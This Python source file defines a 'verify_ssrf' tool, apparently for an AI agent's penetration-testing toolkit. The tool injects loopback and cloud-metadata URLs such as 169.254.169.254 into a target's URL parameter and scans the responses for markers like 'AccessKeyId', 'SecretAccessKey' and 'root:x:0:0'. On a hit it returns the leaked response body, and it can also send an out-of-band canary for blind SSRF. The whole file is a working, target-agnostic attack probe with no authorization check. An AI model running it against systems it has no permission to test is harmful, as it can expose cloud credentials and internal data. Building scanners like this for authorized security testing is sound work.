import requests
from typing import Optional
from pydantic import BaseModel, Field
from tools.base import BaseTool, ToolResult


# Internal / loopback / cloud-metadata targets that a server should never fetch
# on behalf of a user. These are universal SSRF probes, not target-specific.
_DEFAULT_INTERNAL_TARGETS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/",            # link-local cloud instance metadata (AWS/GCP/Azure/DO)
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
]

# Generic indicators that an internal/metadata resource was actually reached.
_INTERNAL_RESPONSE_MARKERS = [
    "meta-data", "instance-id", "ami-id", "iam/security-credentials",
    "computeMetadata", "AccessKeyId", "SecretAccessKey",
    "root:x:0:0", "Server: ", "X-Powered-By",
]


class VerifySSRFInput(BaseModel):
    target_url: str = Field(
        description=(
            "The request URL with the SSRF injection point. Mark it with the literal "
            "token PAYLOAD where the attacker-controlled URL is substituted "
            "(e.g. https://target.com/fetch?url=PAYLOAD). If PAYLOAD is absent, the "
            "tool appends each probe to the end of target_url."
        ),
    )
    payloads: Optional[list[str]] = Field(
        default=None,
        description="Override the internal/metadata probe URLs. Defaults to loopback + cloud-metadata targets.",
    )
    canary_url: Optional[str] = Field(
        default=None,
        description=(
            "Optional out-of-band collaborator URL. When provided it is also injected so "
            "blind SSRF (no in-band response) can be confirmed by an external callback."
        ),
    )
    success_marker: Optional[str] = Field(
        default=None,
        description="Optional response substring that confirms the internal fetch succeeded for this target.",
    )
    timeout: int = Field(default=6, description="Per-request timeout in seconds.")


class VerifySSRFTool(BaseTool):
    name = "verify_ssrf"
    description = (
        "Verify whether a request parameter is vulnerable to Server-Side Request Forgery. "
        "Substitutes internal/loopback and cloud-metadata URLs into the injection point and "
        "reports concrete evidence when the server fetches them. Supports a custom success marker "
        "and an out-of-band canary for blind SSRF. Target-agnostic — no assumptions about the app."
    )
    input_model = VerifySSRFInput

    def _inject(self, target_url: str, payload: str) -> str:
        if "PAYLOAD" in target_url:
            return target_url.replace("PAYLOAD", payload)
        if target_url.endswith("=") or target_url.endswith("?"):
            return f"{target_url}{payload}"
        sep = "&" if "?" in target_url else "?url="
        return f"{target_url}{sep}{payload}"

    def run(self, data: VerifySSRFInput) -> ToolResult:
        probes = list(data.payloads or _DEFAULT_INTERNAL_TARGETS)
        if data.canary_url:
            probes.append(data.canary_url)

        markers = list(_INTERNAL_RESPONSE_MARKERS)
        if data.success_marker:
            markers.append(data.success_marker)

        attempts: list[str] = []
        for payload in probes:
            attack_url = self._inject(data.target_url, payload)
            try:
                response = requests.get(attack_url, timeout=data.timeout)
            except requests.exceptions.RequestException as exc:
                attempts.append(f"{payload} → request error: {exc}")
                continue

            body = response.text or ""
            hit_marker = next((m for m in markers if m and m in body), None)
            if response.status_code == 200 and hit_marker:
                return ToolResult(
                    success=True,
                    output=(
                        "[SSRF CONFIRMED]\n"
                        f"Injection point fetched an internal resource.\n"
                        f"Payload: {payload}\n"
                        f"Match: {hit_marker}\n"
                        f"Evidence (first 500 chars):\n{body[:500]}"
                    ),
                )
            attempts.append(f"{payload} → HTTP {response.status_code}, no internal marker")

        return ToolResult(
            success=False,
            output="SSRF not confirmed in-band. Attempts:\n" + "\n".join(attempts),
        )
